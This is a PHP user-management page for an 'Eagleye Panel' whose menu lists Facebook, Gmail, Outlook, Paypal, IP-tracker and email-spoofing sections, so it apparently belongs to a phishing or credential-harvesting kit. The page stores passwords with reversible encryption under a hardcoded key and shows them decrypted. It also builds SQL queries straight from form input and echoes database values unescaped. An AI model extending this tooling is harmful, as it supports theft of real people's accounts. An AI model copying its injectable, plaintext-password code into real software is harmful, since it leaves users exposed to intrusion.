<?php
 session_start();

if (isset($_SESSION['username'])) {
 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eagleye Panel</title>

    <link rel="stylesheet" type="text/css" href="../panel/bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="../panel/font-awesome/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="../panel/css/local.css" />
    <script type="text/javascript" src="../panel/js/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="../panel/bootstrap/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/light-bootstrap/all.min.css" />
    <link id="gridcss" rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/dark-bootstrap/all.min.css" />
    <script type="text/javascript" src="http://www.shieldui.com/shared/components/latest/js/shieldui-all.min.js"></script>
    <script type="text/javascript" src="http://www.prepbootstrap.com/Content/js/gridData.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script type="text/javascript">       
</script>    
</head>
<body>
    <div id="wrapper">
          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="panel.php">Eagleye Panel</a>
            </div>
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul id="active" class="nav navbar-nav side-nav">
                <li><a href="../panel.php"><i class="fa fa-bullseye"></i> Principal</a></li>

                <?php if ($_SESSION['username']=='admin') { ?>
                    <li  class="selected" class="dropdown user-dropdown"><a href="javascript:;" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-cog"></i> Administrar<b class="caret"></b></a>
                         <ul class="dropdown-menu" role="menu">      
                            <li><a href=""><i class="fa fa-users"></i> Usuarios</a></li>               
                        </ul>
                    </li>
                <?php } ?>

                <li><a href="../facebook/panel.php" ><i class="fa fa-facebook"></i> Facebook</a></li>
                    <li><a href="../gmail/panel.php"><i class="fa fa-google"></i> Gmail</a></li>
                     <li><a href="panel.php"><i class="fa fa-envelope"></i> Outlook</a></li>
                    <li><a href="#"><i class="fa fa-paypal"></i> Paypal</a></li>
                    <li><a href="#"><i class="fa fa-globe"></i> IP tracker</a></li>
                    <li><a href="#"><i class="fa fa-envelope-open"></i> EmailSpoofing</a></li>
                   
                </ul>
                <ul class="nav navbar-nav navbar-right navbar-user">
                    <li class="dropdown messages-dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-envelope"></i> Mensajes <span class="badge">1</span> <b class="caret"></b></a>
                        <ul class="dropdown-menu">
                            <li class="dropdown-header">1 Nuevo Mensaje</li>
                            <li class="message-preview">
                                <a href="#">
                                    <span class="avatar"><i class="fa fa-heart"></i></span>
                                    <span class="message">Te amo</span>
                                </a>
                            </li>
                          <!--   <li class="divider">bell</li>
                            <li class="divider"></li>
                            -->
                        </ul>
                    </li>
                    <?php
                      include("../config.php");
                     
                      if(isset($_SESSION['username'])){
                    ?>  
                    <li class="dropdown user-dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> <?php echo $_SESSION['username'];?><b class="caret"></b></a>
                        <ul class="dropdown-menu">
                            <li><a href="#"><i class="fa fa-user"></i> Perfil</a></li>
                            <li><a href="#"><i class="fa fa-gear"></i> Configuracion</a></li>
                            <li class="divider"></li>
                            <li><a href="../logout.php"><i class="fa fa-power-off"></i> Salir</a></li>

                        </ul>
                    </li>
                    <?php
                    }
                    ?>
                    <li class="divider-vertical"></li>
                </ul>
            </div>
        </nav>
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12 text-right">
                    <h1><a href="" data-toggle="modal" data-target="#myModal" class="btn btn-primary"><span><i class="fa fa-user"></i></span> Nuevo</a></h1>
                </div>
            </div>
           <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            <h3 class="panel-title"><i class="fa fa-users"></i> Usuarios</h3>
                        </div>
                        <div class="panel-body">
                            <table class="table table-bordered table-striped">
            <thead class="thead-dark">
                <tr>
                    <th width="20">No</th>
                    <th>Email</th>
                    <th>Nick</th>
                    <th>Password</th>
                    <th>Tipo</th>
                     <th>Fecha</th>
                    <th width="100">Opciones</th>
                </tr>
            </thead>
            <tbody>
        <?php
        $xs=$_SESSION['username'];
        $query=$mysqli->query("SELECT * FROM `usuarios`");
        $no=1;
        function dec($action, $string) {
                            $output = false;    
                            $encrypt_method = "AES-256-CBC";
                            $secret_key = 'Ab$zU7shXT';
                            $secret_iv = 'Ab$zU7shXT';    
                            $key = hash('sha256', $secret_key);
                            $iv = substr(hash('sha256', $secret_iv), 0, 16);
                            if( $action == 'encrypt' ) {
                                $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
                                $output = base64_encode($output);
                            }
                            else if( $action == 'decrypt' ){
                                     $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
                            }
 
                            return $output;
                        }
                while($row=$query->fetch_assoc()){
        ?>          
                <tr>
                   <td> <?php echo $no++ ?> </td>
                    <td> <?php echo $row['email'] ?> </td>
                    <td> <?php echo $row['nick'] ?> </td>
                    <td> <?php echo dec("decrypt",$row['password'])?> </td>
                    <td> <?php echo $row['tipo'] ?> </td>
                    <td> <?php echo $row['fecha'] ?> </td>
                <td>

                    <a href="" class="btn btn-warning btn-sm"><span class="fa fa-pencil" aria-hidden="true"></span></a>

                    <a onclick="return confirm('¿Seguro que quieres borrar?')" href="delete.php?id=<?php echo $row['id']?>" class="btn btn-danger btn-sm"><span class="fa fa-trash" arai-hidden="true"></span></a>
                </td>
             </tr>
             <?php
                }
            ?>
                
            </tbody>
        </table>
                        </div>
                    </div>
                </div>
           </div>
        </div>
        <!-- <center><h1 style="font-family: verdana;">TE QUIERO MUCHO MI AMOR <img src="https://libertadbajopalabra.com/wp-content/uploads/2018/11/coraz%C3%B3n.png" style="width: 60px; height: 60px;"></h1>
            <h4 style="font-family: verdana; color: grey">ERES LO MEJOR QUE ME HA PASADO</h4>
        </center> -->                        
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Modal Registro -->
<div id="myModal" class="modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">Registrar Usuarios</h3>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <form method="POST">
          <div class="form-group">
            <label for="recipient-name" class="col-form-label">Nick</label>
            <input type="text" class="form-control" id="nick" name="nick" style="width: 250px;">
          </div>
           <div class="form-group">
            <label for="recipient-name" class="col-form-label">Email</label>
            <input type="email" class="form-control" id="email" name="email">
          </div>
          <div class="form-group">
            <label for="recipient-name" class="col-form-label">Password</label>
            <input type="password" class="form-control" id="pass" name="pass">
          </div>
          <div class="form-group">
            <label for="recipient-name" class="col-form-label">Confirmar Password</label>
            <input type="password" class="form-control" id="cpass" name="cpass">
          </div>
           <div class="form-group">
             <label for="recipient-name" class="col-form-label">Tipo de usuario</label>
            <select name="tipo" class="form-control" id="tipo">
            <option>Admin</option>
            <option>Gold</option>
            <option>Premium</option>
            </select>   
          </div>
                 <?php
         if(isset($_POST['regt'])) {

            if($_POST['nick']=='' or $_POST['pass']==''  or  $_POST['cpass']=='' or  $_POST['email']=='') {

        ?>
                              <div class="alert alert-danger alert-dismissible" role="alert">
                              <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><strong>Por favor!</strong> LLene los campos.</div>
        <?php
                      } else{
                        $usuario=$_POST['nick'];
                        $sql = $mysqli->query("select * from usuarios where nick='$usuario'");
                        $verificar = 0;
                        $resultado=$sql->fetch_assoc();

                        if($resultado){
                            $verificar=1;
                        }
                        if($verificar==0){
                            if($_POST['pass'] == $_POST['cpass']){

                                $nick=$_POST['nick'];
                                $email=$_POST['email'];
                                $pw=$_POST['pass'];
                                $pw_en=dec("encrypt",$pw);
                                $tipo=$_POST['tipo'];
                                $fecha=date("Y-m-d");
             $query=$mysqli->query("INSERT INTO `usuarios` (`id`, `nick`, `email`, `password`, `tipo`, `fecha`) VALUES (NULL, '$nick', '$email','$pw_en','$tipo','$fecha')");

                    ?>
                       <div class="alert alert-success alert-dismissible" role="alert">
                        <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span>                         
                        </button><strong>Correcto!</strong> Se ha agregado el usuario.
                        </div>
                    <?php
                            } else{

                             ?>
                              <div class="alert alert-danger alert-dismissible" role="alert">
                              <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><strong>Error!</strong> Contraseñas no coinciden.</div>
                              <?php
                           }
                        }  else{

                             ?>
                              <div class="alert alert-danger alert-dismissible" role="alert">
                              <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><strong>Error!</strong> El usuario ya existe.</div>
                              <?php
                           }
                    } 
                  }
                ?>
                 <div class="modal-footer">
                 <button type="submit" name="regt" id="regt" class="btn btn-success">Enviar</button>
                 <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
              </div>
        </form>
      </div>
    </div>
  </div>
</div>
</body>
</html> 

 <?php
        } else{
            header("location:../index.php");
            }
         ?>
